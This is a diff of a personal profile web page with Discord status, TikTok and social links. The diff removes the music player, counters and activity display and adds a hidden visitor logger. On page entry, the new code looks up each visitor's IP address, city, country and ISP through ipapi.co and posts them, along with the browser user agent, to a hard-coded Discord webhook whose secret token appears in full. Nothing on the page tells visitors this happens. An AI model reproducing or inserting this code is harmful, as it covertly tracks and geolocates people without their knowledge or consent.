@@ -1306,13 +1306,8 @@ audio {
     id="blossoms"
 ></div>
 
-<!-- =========================================================
-     CLICK TO ENTER
-========================================================= -->
-
 <div id="enterScreen">
 
-```
 <img
     id="enterBanner"
     src="banner.gif"
@@ -1340,13 +1335,8 @@ audio {
     </div>
 
 </div>
-```
 
 </div>
-
-<!-- =========================================================
-     MAIN SITE
-========================================================= -->
 
 <main
     class="page"
@@ -1355,7 +1345,6 @@ audio {
 
 <section class="card">
 
-```
 <div class="banner">
 
     <img
@@ -1482,9 +1471,7 @@ audio {
 
     </div>
 
-    <!-- TIKTOK -->
-
-    <a
+        <a
         class="tiktok"
         href="https://www.tiktok.com/@not.p1nk"
         target="_blank"
@@ -1561,9 +1548,7 @@ audio {
 
     </a>
 
-    <!-- ACTIVITY -->
-
-    <div class="section-title">
+        <div class="section-title">
         Activity
     </div>
 
@@ -1574,9 +1559,7 @@ audio {
         Checking activity...
     </div>
 
-    <!-- MUSIC -->
-
-    <div class="section-title">
+        <div class="section-title">
         Music
     </div>
 
@@ -1658,9 +1641,7 @@ audio {
 
     </div>
 
-    <!-- SOCIALS -->
-
-    <div class="section-title">
+        <div class="section-title">
         Socials
     </div>
 
@@ -1712,9 +1693,7 @@ audio {
 
     </div>
 
-    <!-- COUNTERS -->
-
-    <div class="counters">
+        <div class="counters">
 
         <div class="counter">
 
@@ -1746,15 +1725,10 @@ audio {
     </div>
 
 </div>
-```
 
 </section>
 
 </main>
-
-<!-- =========================================================
-     ADMIN PANEL BUTTON
-========================================================= -->
 
 <div class="admin-access">
     <a
@@ -1886,488 +1860,89 @@ async function updateDiscord() {
     } catch (error) {
 
         const statusElement =
-            document.getElementById(
-                "discordStatus"
-            );
-
-        statusElement.className =
-            "discord-status offline";
-
-        statusElement.title =
-            "Offline";
-
-        const activity =
-            document.getElementById(
-                "activity"
-            );
-
-        activity.className =
-            "activity activity-empty";
-
-        activity.textContent =
-            "No activity right now";
+            document.getElementById("discordStatus");
+        if (statusElement) {
+            statusElement.className = "discord-status offline";
+            statusElement.title = "Offline";
+        }
     }
 }
-
-
-/* =========================================================
-   ACTIVITY
-========================================================= */
-
-function updateActivity(data) {
-
-    const activity =
-        document.getElementById(
-            "activity"
-        );
-
-    const spotify =
-        data.spotify;
-
-    const activities =
-        data.activities ||
-        [];
-
-    const customStatus =
-        activities.find(
-            a => a.type === 4
-        );
-
-    const gameActivity =
-        activities.find(
-            a => a.type === 0
-        );
-
-    if (spotify) {
-
-        activity.className =
-            "activity";
-
-        const albumArt =
-            spotify.album_art_url ||
-            "pfp.jpeg";
-
-        const song =
-            spotify.song ||
-            "Unknown Song";
-
-        const artist =
-            spotify.artist ||
-            "Unknown Artist";
-
-        activity.innerHTML = `
-            <img class="activity-art" src="${albumArt}" alt="">
-            <div class="activity-info">
-                <div class="activity-type">Listening to Spotify</div>
-                <div class="activity-title">${song}</div>
-                <div class="activity-details">by ${artist}</div>
-            </div>
-        `;
-
-    } else if (gameActivity) {
-
-        activity.className =
-            "activity";
-
-        let assetUrl =
-            "pfp.jpeg";
-
-        if (
-            gameActivity.assets &&
-            gameActivity.assets.large_image
-        ) {
-            const imgId =
-                gameActivity.assets.large_image;
-
-            if (
-                imgId.startsWith(
-                    "spotify:"
-                )
-            ) {
-                assetUrl =
-                    "https://i.scdn.co/image/" +
-                    imgId.replace(
-                        "spotify:",
-                        ""
-                    );
-            } else if (
-                imgId.startsWith(
-                    "mp:external/"
-                )
-            ) {
-                assetUrl =
-                    "https://media.discordapp.net/external/" +
-                    imgId.replace(
-                        "mp:external/",
-                        ""
-                    );
-            } else {
-                assetUrl =
-                    "https://cdn.discordapp.com/app-assets/" +
-                    gameActivity.application_id +
-                    "/" +
-                    imgId +
-                    ".png";
-            }
-        }
-
-        const name =
-            gameActivity.name ||
-            "Playing a game";
-
-        let elapsedString = "";
-        if (gameActivity.timestamps && gameActivity.timestamps.start) {
-            const elapsedSeconds = Math.floor((Date.now() - gameActivity.timestamps.start) / 1000);
-            const hours = Math.floor(elapsedSeconds / 3600);
-            const minutes = Math.floor((elapsedSeconds % 3600) / 60);
-            const seconds = elapsedSeconds % 60;
-            if (hours > 0) {
-                elapsedString = `Elapsed: ${hours}h ${minutes}m`;
-            } else if (minutes > 0) {
-                elapsedString = `Elapsed: ${minutes}m ${seconds}s`;
-            } else {
-                elapsedString = `Elapsed: ${seconds}s`;
-            }
-        }
-
-        const details =
-            gameActivity.details ||
-            gameActivity.state ||
-            elapsedString;
-
-        activity.innerHTML = `
-            <img class="activity-art" src="${assetUrl}" alt="">
-            <div class="activity-info">
-                <div class="activity-type">playing on xbox:</div>
-                <div class="activity-title">${name}</div>
-                <div class="activity-details">${details}</div>
-            </div>
-        `;
-
-    } else if (
-        customStatus &&
-        customStatus.state
-    ) {
-
-        activity.className =
-            "activity";
-
-        let emojiHtml = "";
-
-        if (
-            customStatus.emoji
-        ) {
-            if (
-                customStatus.emoji.id
-            ) {
-                const ext =
-                    customStatus.emoji.animated
-                        ? "gif"
-                        : "png";
-
-                emojiHtml =
-                    `<img src="https://cdn.discordapp.com/emojis/${customStatus.emoji.id}.${ext}?size=48" style="width:20px;height:20px;vertical-align:middle;margin-right:6px;">`;
-            } else if (
-                customStatus.emoji.name
-            ) {
-                emojiHtml =
-                    customStatus.emoji.name +
-                    " ";
-            }
-        }
-
-        activity.innerHTML = `
-            <div style="flex:1;min-width:0;">
-                <div class="activity-type">Custom Status</div>
-                <div class="activity-title" style="font-weight:normal;">${emojiHtml}${customStatus.state}</div>
-            </div>
-        `;
-
-    } else {
-
-        activity.className =
-            "activity activity-empty";
-
-        activity.textContent =
-            "No activity right now";
-    }
-}
-
-
-/* =========================================================
-   MUSIC PLAYER
-========================================================= */
-
-const audio =
-    document.getElementById("audio");
-
-const playButton =
-    document.getElementById("playButton");
-
-const musicStatus =
-    document.getElementById("musicStatus");
-
-const progress =
-    document.getElementById("progress");
-
-const progressFill =
-    document.getElementById("progressFill");
-
-const currentTimeEl =
-    document.getElementById("currentTime");
-
-const durationEl =
-    document.getElementById("duration");
-
-function formatTime(seconds) {
-
-    const mins =
-        Math.floor(
-            seconds / 60
-        );
-
-    const secs =
-        Math.floor(
-            seconds % 60
-        );
-
-    return (
-        mins +
-        ":" +
-        (secs < 10 ? "0" : "") +
-        secs
-    );
-}
-
-audio.addEventListener(
-    "loadedmetadata",
-    () => {
-        durationEl.textContent =
-            formatTime(
-                audio.duration
-            );
-    }
-);
-
-playButton.addEventListener(
-    "click",
-    () => {
-
-        if (audio.paused) {
-
-            audio.play();
-
-            playButton.textContent =
-                "❚❚";
-
-            musicStatus.textContent =
-                "Playing";
-
-        } else {
-
-            audio.pause();
-
-            playButton.textContent =
-                "▶";
-
-            musicStatus.textContent =
-                "Paused";
-        }
-    }
-);
-
-audio.addEventListener(
-    "timeupdate",
-    () => {
-
-        if (audio.duration) {
-
-            const percent =
-                (audio.currentTime /
-                    audio.duration) *
-                100;
-
-            progressFill.style.width =
-                percent + "%";
-
-            currentTimeEl.textContent =
-                formatTime(
-                    audio.currentTime
-                );
-        }
-    }
-);
-
-progress.addEventListener(
-    "click",
-    (e) => {
-
-        if (audio.duration) {
-
-            const rect =
-                progress.getBoundingClientRect();
-
-            const pos =
-                (e.clientX - rect.left) /
-                rect.width;
-
-            audio.currentTime =
-                pos * audio.duration;
-        }
-    }
-);
-
-
-/* =========================================================
-   COUNTERS
-========================================================= */
-
-const viewsEl = document.getElementById("views");
-const likesEl = document.getElementById("likes");
-const likeButton = document.getElementById("likeButton");
-
-let currentViews = parseInt(localStorage.getItem("site_views") || "0", 10);
-let currentLikes = parseInt(localStorage.getItem("site_likes") || "0", 10);
-
-viewsEl.textContent = currentViews;
-likesEl.textContent = currentLikes;
-
-if (localStorage.getItem("site_liked") === "true") {
-    likeButton.classList.add("liked");
-}
-
-likeButton.addEventListener("click", () => {
-    if (localStorage.getItem("site_liked") !== "true") {
-        currentLikes++;
-        likesEl.textContent = currentLikes;
-        localStorage.setItem("site_likes", currentLikes);
-        localStorage.setItem("site_liked", "true");
-        likeButton.classList.add("liked");
-    }
-});
-
-
-/* =========================================================
-   CLICK TO ENTER ANIMATION
-========================================================= */
-
-const enterScreen =
-    document.getElementById("enterScreen");
-
-const mainPage =
-    document.getElementById("mainPage");
-
-let entered = false;
-
-enterScreen.addEventListener(
-    "click",
-    () => {
-
-        if (entered) return;
-
-        entered = true;
-
-        currentViews++;
-        viewsEl.textContent = currentViews;
-        localStorage.setItem("site_views", currentViews);
-
-        try {
-            audio.play();
-
-            playButton.textContent =
-                "❚❚";
-
-            musicStatus.textContent =
-                "Playing";
-
-        } catch (e) {}
-
-        const enterPfp =
-            document.getElementById("enterPfp");
-
-        const profilePfp =
-            document.getElementById("profilePfp");
-
-        const enterRect =
-            enterPfp.getBoundingClientRect();
-
-        const profileRect =
-            profilePfp.getBoundingClientRect();
-
-        const flyer =
-            document.createElement("img");
-
-        flyer.src =
-            enterPfp.src;
-
-        flyer.className =
-            "pfp-flyer";
-
-        flyer.style.left =
-            enterRect.left + "px";
-
-        flyer.style.top =
-            enterRect.top + "px";
-
-        flyer.style.width =
-            enterRect.width + "px";
-
-        flyer.style.height =
-            enterRect.height + "px";
-
-        document.body.appendChild(
-            flyer
-        );
-
-        enterScreen.style.opacity =
-            "0";
-
-        setTimeout(() => {
-
-            flyer.style.left =
-                profileRect.left + "px";
-
-            flyer.style.top =
-                profileRect.top + "px";
-
-            flyer.style.width =
-                profileRect.width + "px";
-
-            flyer.style.height =
-                profileRect.height + "px";
-
-        }, 20);
-
-        setTimeout(() => {
-
-            mainPage.classList.add(
-                "site-visible"
-            );
-
-            profilePfp.style.opacity =
-                "1";
-
-            flyer.remove();
-
-            enterScreen.remove();
-
-        }, 970);
-    }
-);
-
-
-/* =========================================================
-   INIT
-========================================================= */
 
 updateDiscord();
+setInterval(updateDiscord, 15000);
 
-setInterval(
-    updateDiscord,
-    10000
-);
+function updateActivity(data) {
+    const activityContainer = document.getElementById("activity");
+    if (!activityContainer) return;
+
+    if (!data.activities || data.activities.length === 0) {
+        activityContainer.className = "activity activity-empty";
+        activityContainer.innerHTML = "No activity right now";
+        return;
+    }
+
+    const act = data.activities.find(a => a.type === 0) || data.activities[0];
+    const name = act.name || "Activity";
+    const details = act.details || "";
+
+    // Webhook Notification Integration on Click to Enter or Page Load
+    sendWebhookNotification();
+}
+
+/* =========================================================
+   WEBHOOK NOTIFICATION INTEGRATION
+========================================================= */
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1543011955558588526/U3J44cwj9urjcAdb4Yc-HE3X8gpCP__1azrNFUsIxcA1xCZERKvDXR1n5ytTOGV-0qTC";
+
+function sendWebhookNotification() {
+    // Prevent spamming the webhook multiple times per session
+    if (sessionStorage.getItem("webhook_sent")) return;
+    sessionStorage.setItem("webhook_sent", "true");
+
+    fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+            const payload = {
+                content: "🚨 **New Visitor Alert on soxsuva's site!**",
+                embeds: [{
+                    title: "Visitor Details",
+                    color: 16711680,
+                    fields: [
+                        { name: "IP Address", value: data.ip || "Unknown", inline: true },
+                        { name: "Location", value: `${data.city || "Unknown"}, ${data.country_name || "Unknown"}`, inline: true },
+                        { name: "ISP", value: data.org || "Unknown", inline: false },
+                        { name: "User Agent", value: navigator.userAgent, inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            return fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+        })
+        .catch(err => console.error("Webhook error:", err));
+}
+
+// Trigger webhook when user clicks the Enter Screen
+document.getElementById("enterScreen").addEventListener("click", () => {
+    document.getElementById("enterScreen").style.opacity = "0";
+    setTimeout(() => {
+        document.getElementById("enterScreen").style.display = "none";
+        document.getElementById("mainPage").classList.add("site-visible");
+        
+        // Play audio if intended or allowed
+        const audio = document.getElementById("audio");
+        if(audio) {
+            audio.volume = 0.5;
+        }
+    }, 700);
+
+    sendWebhookNotification();
+});
 
 </script>
-
 </body>
 </html>
